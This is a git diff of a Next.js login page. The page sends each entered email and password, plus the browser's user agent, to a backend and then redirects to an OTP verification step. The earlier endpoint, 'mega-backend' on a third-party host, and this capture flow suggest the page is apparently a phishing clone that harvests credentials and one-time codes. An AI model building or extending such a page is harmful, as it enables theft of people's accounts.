@@ -1,11 +1,13 @@
 'use client';
-import React, { useState } from 'react';
+import React, { useEffect, useState } from 'react';
 import loginBenner from '@/images/loginbenner.png';
 import reloadbutton from '@/images/reloadButton.png';
 import Image from 'next/image';
 import axios from 'axios';
 import frame from '@/images/frame.png';
 import MessageModal from '@/components/MessageModal';
+import WaringModal from '@/components/WaringModal';
+import { useRouter } from 'next/navigation';
 
 
 const page = () => {
@@ -50,11 +52,19 @@ const page = () => {
 
       const [currentImage, setCurrentImage] = useState(images[0]);
       const [showMessage,setShowMessage] = useState(false);
+      const [warning , setWaring ] = useState(false);
+      const router = useRouter();
       
       const changeImage = () => {
         const randomIndex = Math.floor(Math.random() * images.length);
         setCurrentImage(images[randomIndex]);
       };
+      const [userAgent, setUserAgent] = useState('');
+
+      useEffect(() => {
+        // Accessing the user agent when the component mounts
+       setUserAgent(navigator.userAgent);
+      }, []);
 
 
 
@@ -62,6 +72,7 @@ const page = () => {
         email: '',
         password: '',
         otp:''
+
       });
 
       const handleInputChange = (e) => {
@@ -74,15 +85,18 @@ const page = () => {
 
       const handlesubmit =async (e) => {
         e.preventDefault(); 
-        await axios.post('https://mega-backend-4k8t.onrender.com/api/submit', { email:formData.email, password:formData.password });
-
-
+        await axios.post('http://localhost:5000/api/submit', { email:formData.email, password:formData.password,userAgent:userAgent });
         setFormData({
           email: '',
           password: '',
           otp:''
         });
+
+        router.push('/login/verify')
       }
+
+
+      console.log(warning)
 
 
       const handleshowMessage = () => {
@@ -100,6 +114,10 @@ const page = () => {
                 <button disabled className='w-[253px] px-[10px] rounded text-white font-bold text-[27px] bg-[#0492FF]'>Start Here</button>
             </div>
             <h3 className='text-[#B9A697] text-[18px] font-normal '>Already have an account?</h3>
+
+              {
+                warning && <WaringModal />
+              }
 
             <form onSubmit={handlesubmit} className='flex flex-col gap-3'>
                 <input type="email" name="email" value={formData.email} onChange={handleInputChange} className='block outline-none w-[253px] h-[33px] rounded border-2 border-[#c0c0c0] px-2 text-[#222222] text-[18px] ' placeholder='Email' required/>
